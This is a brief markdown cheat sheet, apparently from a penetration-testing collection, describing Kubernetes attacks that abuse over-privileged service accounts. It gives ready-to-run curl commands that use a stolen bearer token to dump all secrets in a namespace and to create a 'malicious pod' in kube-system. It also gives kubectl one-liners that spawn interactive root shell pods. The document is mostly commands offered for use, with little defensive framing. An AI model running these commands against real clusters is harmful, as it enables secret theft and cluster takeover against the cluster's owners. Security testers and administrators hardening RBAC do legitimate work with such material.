# Kubernetes

Collection of Kubernetes Attack vectors based on risky permissions

## Listing secrets

If a attacker is able to overtake a pod he has access to the service accounts JWT that the pod uses to talk to the api server. If the token is privilided to read secretes, the following curl call can be used to get the secretes.
````
curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://<controlpane-ip>:6443/api/v1/namespaces/cloud-idp/secrets | jq  -r ".items[].data"
````

## Spawn a malicious pod via curl

Sometimes, it's necessary to spawn a pod with a stolen Token via curl
````
curl -k -X POST -H "Authorization: Bearer $Token" -H "Content-Type: application/json" https://<controlpane-ip>:6443/api/v1/namespaces/kube-system/pods -d @maliciousPod.json
````


## Spawn a shell in a k8s cluster

````
kubectl run tmp-shell --restart=Never --rm -i --tty --image centos -- /bin/bash
kubectl run tmp-shell --restart=Never --rm -i --tty --image ubuntu -- /bin/bash
